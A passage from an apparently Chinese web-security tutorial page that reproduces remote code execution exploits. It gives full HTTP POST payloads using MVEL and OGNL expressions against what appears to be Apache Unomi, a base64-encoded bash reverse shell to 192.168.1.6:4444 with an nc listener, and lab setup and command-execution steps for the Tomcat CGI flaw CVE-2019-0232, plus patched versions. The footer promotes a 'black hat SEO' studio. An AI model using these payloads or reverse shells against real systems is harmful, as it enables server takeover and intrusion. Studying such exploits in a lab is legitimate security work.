+<p>修改数据包
+   将GET请求改为POST请求；
+   删除多余的字段，保留HOST、User-Agent、Content-Length字段；
+   然后添加以下数据，将dnslog换为自己的地址。
+    ```
+    POST /context.json HTTP/1.1
+    Host: 目标地址:8181
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+    Chrome/86.0.4240.198 Safari/537.36
+    Content-Length: 495</p>
+<p>{
+    "filters": [
+        {
+            "id": "boom",
+            "filters": [
+                {
+                    "condition": {
+                         "parameterValues": {
+                            "test": "script::Runtime r = Runtime.getRuntime(); r.exec(\"ping 
+***.com\");"
+                        },
+                        "type": "profilePropertyCondition"
+                    }
+                }
+            ]
+        }
+    ],
+    "sessionId": "test"
+}
+```</p>
+</li>
+<li>
+<p>发送数据包，然后到dnslog中查看解析记录</p>
+</li>
+<li>
+<p>可以使用此漏洞来反弹shell，将bash反弹shell的命令进行编码，编码在线地址为 
+   ***.com</p>
+<p>```
+bash -i &gt;&amp; /dev/tcp/192.168.1.6/4444 0&gt;&amp;1</p>
+<h1 id="_2">编码后为</h1>
+<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
+```</p>
+</li>
+<li>
+<p>将编码后的shell添加到以下poc的<code>r.exec</code>关键字地方 ()</p>
+</li>
+</ol>
+<pre><code>POST /context.json HTTP/1.1
+Host: localhost:8181
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 483
+
+{
+    &quot;filters&quot;: [
+        {
+            &quot;id&quot;: &quot;sample&quot;,
+            &quot;filters&quot;: [
+                {
+                    &quot;condition&quot;: {
+                         &quot;parameterValues&quot;: {
+                            &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;bash -c 
+{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\&quot;);&quot;
+                        },
+                        &quot;type&quot;: &quot;profilePropertyCondition&quot;
+                    }
+                }
+            ]
+        }
+    ],
+    &quot;sessionId&quot;: &quot;sample&quot;
+}
+</code></pre>
+<ol start="5">
+<li>nc监听，接收反弹shell<code>nc -lvp 4444</code></li>
+</ol>
+<p>上面使用的是通过MVEL表达式执行任意命令，下面使用OGNL表达式执行任意命令
+在漏洞首页抓取请求包然后发送到Repeater模块中构造数据包，构造的poc如下</p>
+<pre><code>POST /context.json HTTP/1.1
+Host: localhost:8181
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 1064
+
+{
+    &quot;personalizations&quot;:[
+    {
+      &quot;id&quot;:&quot;gender-test&quot;,
+      &quot;strategy&quot;:&quot;matching-first&quot;,
+      &quot;strategyOptions&quot;:{
+        &quot;fallback&quot;:&quot;var2&quot;
+      },
+      &quot;contents&quot;:[
+        {
+          &quot;filters&quot;:[
+            {
+              &quot;condition&quot;:{
+                &quot;parameterValues&quot;:{
+                  &quot;propertyName&quot;:&quot;(#runtimeclass = #this.getClass().forName(\&quot;java.lang.Runtime\&quot;)). 
+ (#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\&quot;getRuntime\&quot;)}[0]). 
+ (#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? 
+ #this.name.equals(\&quot;exec\&quot;)}.{? #this.getParameters() 
+ [0].getType().getName().equals(\&quot;java.lang.String\&quot;)}.{? #this.getParameters().length &lt; 2}[0]). 
+ (#execmethod.invoke(#rtobj,\&quot;touch /tmp/ognl\&quot;))&quot;,
+                  &quot;comparisonOperator&quot;:&quot;equals&quot;,
+                  &quot;propertyValue&quot;:&quot;male&quot;
+                },
+                &quot;type&quot;:&quot;profilePropertyCondition&quot;
+              }
+            }
+          ]
+        }
+      ]
+    }
+    ],
+    &quot;sessionId&quot;:&quot;sample&quot;
+}
+</code></pre>
+<p>提交后可以看到成功在 /tmp/ 目录下成功创建了一个文件，也可以利用这个漏洞反弹shell</p>
+<p><img alt="c134e20a187845bdf0b4a70703092b00.png" src="../../_resources/c1e4b8fb0f254267baadd8b7538d9280.png" /></p>
+<h2 id="5cve-2019-0232-apache-tomcat">5、CVE-2019-0232 Apache Tomcat远程代码执行漏洞</h2>
+<p><strong>漏洞描述</strong></p>
+<p>该漏洞只对Windows平台有效，攻击者向CGI Servlet发送请求，可在具有Apache Tomcat权限的系统上注入和执行任意操作系统命令。
+漏洞成因是当将参数从JRE传递到Windows环境时，由于CGI_Servlet中的输入验证错误而存在该漏洞。CGI_Servlet默认是关闭的</p>
+<p><strong>漏洞影响范围</strong></p>
+<blockquote>
+<p>Apache Tomcat 9.0.0.M1 ~ 9.0.17
+Apache Tomcat 8.5.0 ~ 8.5.39
+Apache Tomcat 7.0.0 ~ 7.0.93</p>
+</blockquote>
+<p>环境搭建
+<strong>环境：Java8+Apache Tomcat 8.5.39</strong></p>
+<ol>
+<li>安装tomcat需要java环境，jdk下载地址(***.com</li>
+<li>下载完后配置环境变量，输出java -version验证是否配置成功</li>
+<li>安装tomcat8.5.39版本
+下载地址(***.com</li>
+<li>
+<p>下载完成后进行解压然后配置tomcat，
+   打开Tomcat按目录下的conf/web.xml 取消以下两项的注释，否则访问cgi目录会提示404
+    ```xml
+    <servlet>
+        <servlet-name>cgi</servlet-name>
+        <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
+        <init-param>
+          <param-name>debug</param-name>
+          <param-value>0</param-value>
+        </init-param>
+        <init-param>
+          <param-name>cgiPathPrefix</param-name>
+          <param-value>WEB-INF/cgi-bin</param-value>
+        </init-param>
+        <init-param>
+          <param-name>executable</param-name>
+          <param-value></param-value>
+        </init-param>
+         <load-on-startup>5</load-on-startup>
+    </servlet> </p>
+<!-- The mapping for the CGI Gateway servlet -->
+<p><servlet-mapping>
+    <servlet-name>cgi</servlet-name>
+    <url-pattern>/cgi-bin/*</url-pattern>
+</servlet-mapping>
+<code>5. 修改在conf/context.xml中的`&lt;Context&gt;`,添加privileged="true"语句
+6. 在webapps/ROOT/WEB-INF下创建一个cgi-bin文件夹，并在文件夹内创建一个test.bat</code>bat
+@echo off
+echo Content-type: text/plain
+echo.
+set off=%~<code>off%</code></p>
+</li>
+<li>
+<p>都配置完成之后进入bin目录下运行startup.bat启动tomcat</p>
+</li>
+<li>
+<p>访问搭建后的页面，若出现tomcat页面则说明搭建成功</p>
+</li>
+</ol>
+<p><strong>漏洞复现</strong></p>
+<ol>
+<li>在浏览器访问,执行net user 命令</li>
+</ol>
+<pre><code>***.com
+</code></pre>
+<ol start="2">
+<li>执行whoami命令</li>
+</ol>
+<pre><code>***.com
+</code></pre>
+<p><strong>漏洞修复</strong></p>
+<p>受影响版本的用户应该应用下列其中一项缓解。升级到：</p>
+<blockquote>
+<p>Apache Tomcat 9.0.18或更高版本
+Apache Tomcat 8.5.40或更高版本
+Apache Tomcat 7.0.93或更高版本</p>
+</blockquote></div></article><nav class="pager"><a class="pg prev" href="../middleware-parsing-vulnerabilities/"><span>上一篇</span><b>中间件解析漏洞</b></a><a class="pg next" href="../jboss-exploitation/"><span>下一篇</span><b>Jboss漏洞利用总结</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
